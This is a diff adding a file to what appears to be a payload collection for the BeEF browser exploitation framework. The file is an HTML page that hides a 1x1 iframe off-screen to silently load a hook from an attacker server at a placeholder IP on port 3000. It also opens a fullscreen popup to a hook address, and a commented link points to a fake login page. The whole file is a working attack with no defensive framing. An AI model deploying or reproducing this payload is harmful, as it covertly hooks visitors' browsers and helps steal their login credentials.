+++ payloads/beef-hooks/beef_auto-pop_alert-iFrame
@@ -1,0 +1,27 @@
+<html>
+  <head>
+    <script type="text/javascript">
+      function popup(url) 
+      {
+       params  = 'width='+screen.width;
+       params += ', height='+screen.height;
+       params += ', top=0, left=0'
+       params += ', fullscreen=yes';
+
+       newwin=window.open(url,'windowname4', params);
+       }
+    </script>
+  </head>
+    <body>
+    <!-- <a href="javascript: void(0)" onclick="popup('http://<IP_address>:3000/demos/butcher/index.html')">If the login page didn't open, click here</a> -->
+    <a href="javascript: void(0)" onclick="popup('http://<ip-address_n_hook>')">Fullscreen popup window</a>
+    <!-- The below should force the pop-up, but it doesn't -->
+    <!-- <a href="javascript: void(0)" fLoad="popup()"> -->
+    <div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">
+      <iframe width="1" scrolling="no" height="1" frameborder="0" src="http://<IP-ADDRESS>:3000/demos/butcher/index.html">
+    </div>
+   
+  </body>
+</html>
+
+
